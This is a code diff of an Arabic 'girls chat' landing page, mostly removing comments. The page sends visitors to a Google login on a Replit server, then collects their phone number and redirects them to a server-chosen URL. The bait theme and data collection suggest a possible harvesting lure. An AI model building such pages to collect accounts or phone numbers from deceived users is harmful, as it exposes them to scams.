@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>مرحباً بك في شات البنات! 🌸</title>
     <style>
+        /* ... (كل أكواد الـ CSS هنا تبدو سليمة ولا تؤثر على الوظيفة) ... */
         body {
             margin: 0; padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -13,7 +14,7 @@
             color: #333;
             background-size: cover;
             background-position: center;
-            transition: background-image 0.5s ease-in-out; /* لتغيير سلس للخلفية */
+            transition: background-image 0.5s ease-in-out;
         }
         .container {
             background: rgba(255, 255, 255, 0.95);
@@ -21,11 +22,11 @@
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             text-align: center;
-            max-width: 480px; /* زيادة بسيطة للعرض */
+            max-width: 480px;
             width: 90%;
             animation: fadeIn 1s ease-out;
-            position: relative; /* للمساعدة في وضع العناصر */
-            z-index: 2; /* فوق الخلفية */
+            position: relative;
+            z-index: 2;
         }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(-20px); }
@@ -33,21 +34,21 @@
         }
         h1 {
             margin-bottom: 25px;
-            font-size: 34px; /* حجم أكبر */
-            color: #d62c8e; /* لون بناتي */
+            font-size: 34px;
+            color: #d62c8e;
             line-height: 1.3;
             text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
         p {
-            font-size: 1.15em; /* حجم أكبر للنص */
+            font-size: 1.15em;
             margin-bottom: 30px;
             color: #666;
             line-height: 1.6;
         }
         .login-btn {
             font-size: 20px;
-            padding: 15px 30px; /* زيادة في الحجم */
-            background: #4285F4; /* Google Blue */
+            padding: 15px 30px;
+            background: #4285F4;
             color: white;
             border: none;
             border-radius: 8px;
@@ -57,27 +58,27 @@
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 12px; /* مسافة أكبر بين الأيقونة والنص */
+            gap: 12px;
             transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
         }
         .login-btn:hover {
             background: #3367D6;
-            transform: translateY(-4px); /* حركة أجمل */
+            transform: translateY(-4px);
             box-shadow: 0 6px 15px rgba(0,0,0,0.4);
         }
         .login-btn img {
-            width: 26px; /* حجم أكبر للأيقونة */
+            width: 26px;
             height: 26px;
         }
 
         /* Phone Input Section Styling */
         .phone-section {
-            display: none; /* Hidden by default */
+            display: none;
             margin-top: 25px;
         }
         .phone-section h2 {
             font-size: 30px;
-            color: #d62c8e; /* نفس اللون البينك */
+            color: #d62c8e;
             margin-bottom: 20px;
             text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
@@ -88,9 +89,9 @@
         }
         .phone-section input[type="tel"] {
             width: calc(100% - 24px);
-            padding: 14px; /* حجم أكبر للـ input */
+            padding: 14px;
             margin-bottom: 20px;
-            border: 1px solid #d62c8e; /* border بلون بناتي */
+            border: 1px solid #d62c8e;
             border-radius: 8px;
             font-size: 19px;
             box-sizing: border-box;
@@ -98,9 +99,9 @@
             box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
         }
         .phone-section button {
-            background-color: #ff69b4; /* Pink for submit */
+            background-color: #ff69b4;
             color: white;
-            padding: 15px 30px; /* حجم أكبر للزر */
+            padding: 15px 30px;
             font-size: 19px;
             border: none;
             border-radius: 8px;
@@ -156,8 +157,8 @@
         const phoneMessage = document.getElementById('phoneMessage');
 
         // صور الخلفية المختلفة
-        const loginBgImage = 'https://images.unsplash.com/photo-1517726558451-b06256277983?auto=format&fit=crop&w=1400&q=80'; // صورة بنت كيوت للمرحلة الأولى
-        const phoneBgImage = 'https://images.unsplash.com/photo-1543852786-1cf6624237c8?auto=format&fit=crop&w=1400&q=80'; // صورة بنت كيوت مختلفة للمرحلة الثانية
+        const loginBgImage = 'https://images.unsplash.com/photo-1517726558451-b06256277983?auto=format&fit=crop&w=1400&q=80';
+        const phoneBgImage = 'https://images.unsplash.com/photo-1543852786-1cf6624237c8?auto=format&fit=crop&w=1400&q=80';
 
         // دالة لتغيير الخلفية
         function setBackgroundImage(imageUrl) {
@@ -166,7 +167,7 @@
 
         // الربط الصحيح لزر تسجيل الدخول بجوجل
         document.getElementById('googleLoginBtn').addEventListener('click', (event) => {
-            event.preventDefault(); // منع السلوك الافتراضي للرابط
+            event.preventDefault();
             window.location.href = `${REPLIT_SERVER_URL}/auth/google`;
         });
 
@@ -183,11 +184,11 @@
             if (authStatus === 'success') {
                 loginSection.style.display = 'none';
                 phoneSection.style.display = 'block';
-                setBackgroundImage(phoneBgImage); // تغيير الخلفية لمرحلة رقم الهاتف
+                setBackgroundImage(phoneBgImage);
             } else {
                 loginSection.style.display = 'block';
                 phoneSection.style.display = 'none';
-                setBackgroundImage(loginBgImage); // الخلفية الافتراضية لتسجيل الدخول
+                setBackgroundImage(loginBgImage);
             }
         });
 
@@ -220,11 +221,11 @@
                 });
 
                 if (response.ok) {
-                    const data = await response.json(); // قراءة الـ JSON من الاستجابة
+                    const data = await response.json();
                     phoneMessage.textContent = data.message;
                     phoneMessage.className = 'message success';
                     setTimeout(() => {
-                        window.location.href = data.redirectUrl; // **استخدام رابط التحويل من السيرفر**
+                        window.location.href = data.redirectUrl;
                     }, 1500); 
                 } else {
                     const errorData = await response.json();
